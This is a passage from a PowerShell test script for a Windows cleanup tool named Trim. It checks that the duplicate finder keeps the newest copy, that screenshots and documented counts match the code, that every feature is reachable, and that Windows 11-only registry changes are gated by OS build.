        $capped = @(Get-LargeFileScan -Roots @($dir) -MinimumMB 1 -Top 1 -TimeoutSeconds 30)
        if ($capped.Count -ne 1) { $problems.Add("-Top 1 returned $($capped.Count) rows") | Out-Null }
        elseif ($capped[0].Path -notlike '*deep-largest*') {
            $problems.Add('-Top 1 kept a smaller file than the largest one') | Out-Null
        }

        # The files somebody would otherwise try to delete have to say so.
        foreach ($case in @(
            @{ Name = 'pagefile.sys';  Ext = '.sys' },
            @{ Name = 'swapfile.sys';  Ext = '.sys' },
            @{ Name = 'hiberfil.sys';  Ext = '.sys' })) {
            $kind = Get-FileKind -Extension $case.Ext -Name $case.Name
            if ($kind -notmatch 'leave alone|disable hibernation') {
                $problems.Add("$($case.Name) is described as '$kind', which does not warn anyone off it") | Out-Null
            }
        }

        if ($problems.Count) { throw ($problems -join '; ') }
    }
    finally { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue }
}

Test-Phase 'The duplicate finder always keeps one copy' {
    # Deleting every copy of a file is the one mistake in this whole program
    # that no undo script, restore point or .reg export can reverse. The code
    # keeps the newest and offers the rest; nothing checked that it does.
    # Driven against a scratch directory with known contents, so the assertion
    # means the same thing on any machine.
    $dir = Join-Path ([IO.Path]::GetTempPath()) "trim-dupe-$([Guid]::NewGuid().ToString('N'))"
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $sub = Join-Path $dir 'nested'
    New-Item -ItemType Directory -Force -Path $sub | Out-Null

    try {
        $problems = [System.Collections.Generic.List[string]]::new()

        # 2 MB of identical bytes, three times, one of them in a subdirectory.
        $blob = New-Object byte[] (2MB)
        (New-Object Random 42).NextBytes($blob)
        $trio = @((Join-Path $dir 'a.bin'), (Join-Path $dir 'b.bin'), (Join-Path $sub 'c.bin'))
        foreach ($p in $trio) { [IO.File]::WriteAllBytes($p, $blob) }

        # Same size, different content - a size match is not a duplicate.
        $other = New-Object byte[] (2MB)
        (New-Object Random 7).NextBytes($other)
        [IO.File]::WriteAllBytes((Join-Path $dir 'different.bin'), $other)

        # Identical but under the size floor: not worth anyone's attention.
        $tiny = New-Object byte[] (16KB)
        (New-Object Random 9).NextBytes($tiny)
        [IO.File]::WriteAllBytes((Join-Path $dir 'tiny1.bin'), $tiny)
        [IO.File]::WriteAllBytes((Join-Path $dir 'tiny2.bin'), $tiny)

        # Make "newest" unambiguous rather than dependent on write order.
        $t = Get-Date
        (Get-Item $trio[0]).LastWriteTime = $t.AddHours(-3)
        (Get-Item $trio[1]).LastWriteTime = $t.AddHours(-2)
        (Get-Item $trio[2]).LastWriteTime = $t              # the newest, must be kept

        $rows = @(Get-DuplicateScan -Roots @($dir) -MinimumMB 1)

        if ($rows.Count -ne 2) {
            throw "3 identical files should yield 2 deletable copies; got $($rows.Count): $(($rows | ForEach-Object { $_.Path }) -join ', ')"
        }

        $offered = @($rows | ForEach-Object { $_.Path })
        if ($offered -contains $trio[2]) { $problems.Add('the newest copy is offered for deletion') | Out-Null }
        foreach ($p in @($trio[0], $trio[1])) {
            if ($offered -notcontains $p) { $problems.Add("'$p' is an older duplicate and was not offered") | Out-Null }
        }

        # Whatever each row says it is keeping must itself survive.
        foreach ($r in $rows) {
            if (-not $r.Keeps)               { $problems.Add("'$($r.Path)' does not say what it keeps") | Out-Null; continue }
            if ($offered -contains $r.Keeps) { $problems.Add("'$($r.Keeps)' is named as the copy to keep and is also offered for deletion") | Out-Null }
            if (-not (Test-Path -LiteralPath $r.Keeps)) { $problems.Add("'$($r.Keeps)' is named as the copy to keep but does not exist") | Out-Null }
        }

        foreach ($never in @('different.bin', 'tiny1.bin', 'tiny2.bin')) {
            if (@($offered | Where-Object { $_ -like "*\$never" }).Count) {
                $problems.Add("$never was offered as a duplicate") | Out-Null
            }
        }

        # Losing a file is not a safe default.
        if (@($rows | Where-Object { $_.Selected }).Count) { $problems.Add('duplicates are selected by default') | Out-Null }
        foreach ($r in $rows) {
            if ($r.Tier -eq 'safe') { $problems.Add("'$($r.Path)' is marked safe; deleting a file never is") | Out-Null }
            if ($r.Key -notlike 'dupe|*') { $problems.Add("'$($r.Path)' has key '$($r.Key)'") | Out-Null }
        }

        # Nothing may have been touched by looking.
        foreach ($p in ($trio + @((Join-Path $dir 'different.bin')))) {
            if (-not (Test-Path -LiteralPath $p)) { $problems.Add("'$p' disappeared during a scan that only measures") | Out-Null }
        }

        if ($problems.Count) { throw ($problems -join '; ') }
    }
    finally { Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue }
}

Test-Phase 'The screenshots are of the window that exists now' {
    # The README leads with a picture of the window and shows four more. When
    # the window changes and nobody regenerates them, the README describes
    # software that no longer exists - and the people it is aimed at are being
    # asked to pipe this into an elevated shell on the strength of what they
    # can see of it.
    #
    # This was kept in sync twice in one day by noticing, which is not a
    # mechanism. It does not prove the images are right; it proves they were
    # taken after the last change to the window.
    $shots = Join-Path $root 'docs\screenshots'
    if (-not (Test-Path -LiteralPath $shots)) { return }   # nothing to keep honest

    $problems = [System.Collections.Generic.List[string]]::new()

    $png = @(Get-ChildItem -LiteralPath $shots -Filter '*.png' -File -ErrorAction SilentlyContinue)
    if (-not $png.Count) { throw 'docs\screenshots holds no images' }

    $stampFile = Join-Path $shots 'generated-from.txt'
    if (-not (Test-Path -LiteralPath $stampFile)) {
        throw "docs\screenshots has $($png.Count) image(s) and no generated-from.txt, so there is no way to tell whether they are current. Run test\Export-GuiScreenshots.ps1"
    }

    $recorded = ''
    foreach ($line in (Get-Content -LiteralPath $stampFile)) {
        if ($line -match '^\s*13-gui\.ps1\s+([0-9A-Fa-f]{64})\s*$') { $recorded = $Matches[1].ToUpper() }
    }
    if (-not $recorded) { $problems.Add('generated-from.txt records no hash for 13-gui.ps1') | Out-Null }

    . (Join-Path $root 'test\Get-GuiFingerprint.ps1')
    $actual = (Get-GuiFingerprint -Path (Join-Path (Join-Path $root 'src') '13-gui.ps1')).ToUpper()
    if ($recorded -and $recorded -ne $actual) {
        $problems.Add("the window has changed since the screenshots were taken - run test\Export-GuiScreenshots.ps1 (screenshots: $($recorded.Substring(0,12)), source now: $($actual.Substring(0,12)))") | Out-Null
    }

    # Every image the README points at has to exist, or it renders a broken
    # link on the project's front page.
    $readme = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path $root 'README.md')
    foreach ($m in [regex]::Matches($readme, 'docs/screenshots/([A-Za-z0-9._-]+\.png)')) {
        $named = $m.Groups[1].Value
        if (-not (Test-Path -LiteralPath (Join-Path $shots $named))) {
            $problems.Add("README shows docs/screenshots/$named, which does not exist") | Out-Null
        }
    }

    # The site keeps a second copy of every screenshot, as WebP. Regenerating
    # the PNGs does not regenerate those, and for a day it did not: the site
    # showed a window twenty hours and five changes out of date. Guarding the
    # README's copies and not the site's is guarding the one fewer people see.
    $img  = Join-Path $root 'hosting\site\img'
    $page = Join-Path $root 'hosting\site\index.html'
    if ((Test-Path -LiteralPath $img) -and (Test-Path -LiteralPath $page)) {
        $siteStamp = Join-Path $img 'generated-from.txt'
        if (-not (Test-Path -LiteralPath $siteStamp)) {
            $problems.Add('hosting\site\img has no generated-from.txt, so there is no way to tell whether the site images are current. Run hosting\Build-SiteAssets.ps1') | Out-Null
        }
        else {
            $recordedPng = @{}
            foreach ($line in (Get-Content -LiteralPath $siteStamp)) {
                if ($line -match '^\s*([A-Za-z0-9._-]+\.png)\s+([0-9A-Fa-f]{64})\s*$') {
                    $recordedPng[$Matches[1]] = $Matches[2].ToUpper()
                }
            }
            if (-not $recordedPng.Count) {
                $problems.Add('hosting\site\img\generated-from.txt records no source screenshots') | Out-Null
            }
            foreach ($name in $recordedPng.Keys) {
                $srcPng = Join-Path $shots $name
                if (-not (Test-Path -LiteralPath $srcPng)) {
                    $problems.Add("the site was built from $name, which no longer exists") | Out-Null
                    continue
                }
                # PNGs are binary in .gitattributes, so raw bytes survive a
                # clone and comparing them raw is correct here.
                $now = (Get-FileHash -LiteralPath $srcPng -Algorithm SHA256).Hash.ToUpper()
                if ($now -ne $recordedPng[$name]) {
                    $problems.Add("the site's images are older than $name - run hosting\Build-SiteAssets.ps1") | Out-Null
                }
            }
        }

        # And every image the page asks for must be on disk, or the site shows
        # a broken picture where a screenshot should be.
        # Each image is named several times over in a srcset, so report each
        # missing one once rather than once per mention.
        $html = Get-Content -Raw -Encoding UTF8 -LiteralPath $page
        $asked = @{}
        foreach ($m in [regex]::Matches($html, 'img/([A-Za-z0-9._@-]+\.(?:webp|png|svg))')) {
            $asked[$m.Groups[1].Value] = $true
        }
        foreach ($named in ($asked.Keys | Sort-Object)) {
            if (-not (Test-Path -LiteralPath (Join-Path $img $named))) {
                $problems.Add("the site asks for img/$named, which does not exist") | Out-Null
            }
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'The documented numbers are the real ones' {
    # The README and the site said thirteen phases and thirteen cleanup
    # categories. There were twelve of each. Nobody was lying - the counts were
    # written by hand, the code changed, and nothing tied one to the other. It
    # is a small thing that quietly makes every other number on the page worth
    # less, on a project whose whole pitch is that you can check what it does.
    $problems = [System.Collections.Generic.List[string]]::new()

    $main    = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '99-main.ps1')
    $cleanup = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '16-cleanup.ps1')
    $header  = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')

    # The phases are whatever Invoke-AllPhases actually gates on.
    $phases = @([regex]::Matches($main, "Test-PhaseEnabled\s+'([^']+)'") | ForEach-Object { $_.Groups[1].Value })
    if ($phases.Count -lt 5) { throw "found only $($phases.Count) phases in Invoke-AllPhases - this guard has stopped finding them" }

    # The categories are whatever Get-CleanupDefinitions declares.
    $defsBlock = ''
    $m = [regex]::Match($cleanup, '(?s)function Get-CleanupDefinitions \{.*?\n\}')
    if ($m.Success) { $defsBlock = $m.Value }
    $catCount = @([regex]::Matches($defsBlock, "(?m)^\s*Add-Def\s")).Count
    if ($catCount -lt 5) { throw "found only $catCount cleanup categories - this guard has stopped finding them" }

    # -Skip and -Only must offer exactly the phases that exist, and offer each
    # of them once. -Skip listed 'Extras' twice.
    foreach ($sw in @('Skip', 'Only')) {
        $vm = [regex]::Match($header, "\[ValidateSet\(([^)]*)\)\]\s*\r?\n\s*\[string\[\]\]\`$$sw\b")
        if (-not $vm.Success) { $problems.Add("cannot find the ValidateSet for -$sw") | Out-Null; continue }
        $listed = @([regex]::Matches($vm.Groups[1].Value, "'([^']+)'") | ForEach-Object { $_.Groups[1].Value })
        $dupes = @($listed | Group-Object | Where-Object { $_.Count -gt 1 } | ForEach-Object { $_.Name })
        if ($dupes.Count) { $problems.Add("-$sw lists $($dupes -join ', ') more than once") | Out-Null }
        $missing = @($phases | Where-Object { $listed -notcontains $_ })
        $extra   = @($listed | Where-Object { $phases -notcontains $_ } | Select-Object -Unique)
        if ($missing.Count) { $problems.Add("-$sw cannot name the $($missing -join ', ') phase(s)") | Out-Null }
        if ($extra.Count)   { $problems.Add("-$sw offers $($extra -join ', '), which is not a phase") | Out-Null }
    }

    # Every count stated in prose, in both the README and the landing page.
    $words = @{}
    $i = 0
    foreach ($w in @('zero','one','two','three','four','five','six','seven','eight','nine','ten',
                     'eleven','twelve','thirteen','fourteen','fifteen','sixteen','seventeen',
                     'eighteen','nineteen','twenty')) { $words[$w] = $i; $i++ }

    $claims = 0
    foreach ($rel in @('README.md', 'hosting\site\index.html')) {
        $path = Join-Path $root $rel
        if (-not (Test-Path -LiteralPath $path)) { continue }
        $text = Get-Content -Raw -Encoding UTF8 -LiteralPath $path
        foreach ($c in [regex]::Matches($text, '(?i)\b([A-Za-z0-9]+)\s+(phases|categories)\b')) {
            $tok = $c.Groups[1].Value.ToLower()
            $val = if ($tok -match '^\d+$') { [int]$tok } elseif ($words.ContainsKey($tok)) { $words[$tok] } else { $null }
            # 'the phases', 'those categories' and the like are not claims.
            if ($null -eq $val) { continue }
            $claims++
            $want = if ($c.Groups[2].Value.ToLower() -eq 'phases') { $phases.Count } else { $catCount }
            if ($val -ne $want) {
                $problems.Add("$rel says '$($c.Value.Trim())' but there are $want") | Out-Null
            }
        }
    }
    if ($claims -lt 2) {
        $problems.Add("only $claims stated count(s) found across the README and the site - this guard has stopped finding them") | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Every feature is reachable' {
    # Get-LargeFileScan shipped as dead code: written, unit-checked in isolation,
    # wired to nothing, and reported as delivered. This asserts that anything
    # presented as a feature can actually be reached, from the window or the
    # command line.
    $problems = [System.Collections.Generic.List[string]]::new()

    $gui  = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '13-gui.ps1')
    $main = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '99-main.ps1')
    $head = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')
    $all  = ($gui + $main + $head)

    # Each entry: the function, and where a caller has to exist.
    $reachable = @(
        @{ Name = 'Get-LargeFileScan';  In = $all;  Where = 'the window or the command line' },
        @{ Name = 'Get-DuplicateScan';  In = $all;  Where = 'the window or the command line' },
        @{ Name = 'Get-StartupItems';   In = $all;  Where = 'the window' },
        @{ Name = 'Disable-StartupItem';In = $gui;  Where = 'the window' },
        @{ Name = 'Get-CleanupScan';    In = $all;  Where = 'the window or the command line' }
    )
    foreach ($r in $reachable) {
        if ($r.In -notmatch [regex]::Escape($r.Name)) {
            $problems.Add("$($r.Name) is never called from $($r.Where)") | Out-Null
        }
    }

    # A switch nobody reads is the same fault wearing a different hat.
    foreach ($sw in @('LargeFiles', 'IncludeDuplicates', 'Cleanup')) {
        if ($main -notmatch "\`$$sw") {
            $problems.Add("-$sw is declared but 99-main never reads it") | Out-Null
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Windows 10 gating' {
    # The site tells Windows 10 users that Trim "skips whatever does not apply
    # to your build". For a long time nothing gated on the OS at all - it warned
    # and then wrote Windows 11 keys anyway. This asserts the claim is true.
    $problems = [System.Collections.Generic.List[string]]::new()

    # 1. The fact exists and agrees with the build number.
    $f = Get-MachineFacts
    if ($null -eq $f.PSObject.Properties['IsWindows11']) {
        $problems.Add('Get-MachineFacts does not report IsWindows11') | Out-Null
    } elseif ($f.IsWindows11 -ne ($f.OSBuild -ge 22000)) {
        $problems.Add("IsWindows11=$($f.IsWindows11) disagrees with build $($f.OSBuild)") | Out-Null
    }

    # 2. Every setting known to be Windows 11 only carries a gate.
    $needsGate = @(
        'Start_IrisRecommendations', 'TaskbarDa', 'AllowNewsAndInterests',
        'BackgroundType', 'EnableSnapAssistFlyout'
    )
    $srcText = @{}
    foreach ($file in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $srcText[$file.Name] = Get-Content -Raw -Encoding UTF8 -LiteralPath $file.FullName
    }
    foreach ($key in $needsGate) {
        $found = $false
        foreach ($name in $srcText.Keys) {
            foreach ($line in ($srcText[$name] -split "`r?`n")) {
                if ($line -match [regex]::Escape($key) -and $line -match 'Set-Reg|Remove-Reg') {
                    $found = $true
                    # The gate may sit on the continuation line, so test the
                    # whole statement rather than just the line the key is on.
                    $stmt = $line
                    if ($line.TrimEnd().EndsWith('`')) {
                        $idx = ($srcText[$name] -split "`r?`n").IndexOf($line)
                        $stmt += ' ' + ($srcText[$name] -split "`r?`n")[$idx + 1]
                    }
                    if ($stmt -notmatch 'MinBuild|MaxBuild') {
                        $problems.Add("$key is written with no build gate ($name)") | Out-Null
                    }
                }
            }
        }
        if (-not $found) { $problems.Add("$key is no longer written anywhere - update this test") | Out-Null }
    }

    # 3. The gate actually refuses. Drive it directly rather than trusting that
    #    passing the parameter is the same as it being honoured.
    $saved = $script:MachineFacts
    try {
        $script:MachineFacts = [pscustomobject]@{ OSBuild = 19045 }   # Windows 10 22H2
        if (Test-BuildApplies -MinBuild 22000 -What 'test') {
            $problems.Add('Test-BuildApplies allowed a Windows 11-only change on build 19045') | Out-Null
        }
        if (-not (Test-BuildApplies -MaxBuild 21999 -What 'test')) {
            $problems.Add('Test-BuildApplies refused a Windows 10-only change on build 19045') | Out-Null
        }
        $script:MachineFacts = [pscustomobject]@{ OSBuild = 26100 }   # Windows 11 24H2
        if (-not (Test-BuildApplies -MinBuild 22000 -What 'test')) {
            $problems.Add('Test-BuildApplies refused a Windows 11 change on build 26100') | Out-Null
        }
        if (Test-BuildApplies -MaxBuild 21999 -What 'test') {
            $problems.Add('Test-BuildApplies allowed a Windows 10-only change on build 26100') | Out-Null
        }
    } finally {
        $script:MachineFacts = $saved
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Privacy carve-out guard' {
    foreach ($c in @('webcam','microphone','graphicsCaptureProgrammatic','graphicsCaptureWithoutBorder')) {
        if ($script:ConsentDeny -contains $c)        { throw "'$c' must never be in the deny list" }
        if ($script:ConsentNeverTouch -notcontains $c) { throw "'$c' must be in the never-touch list" }
    }
}

Write-Host ''
if ($failures.Count -eq 0) {
    Write-Host "All checks passed. Log: $($script:LogPath)" -ForegroundColor Green
    exit 0
} else {
    Write-Host "$($failures.Count) failure(s):" -ForegroundColor Red
    foreach ($f in $failures) { Write-Host "  - $f" -ForegroundColor Red }
    exit 1
}
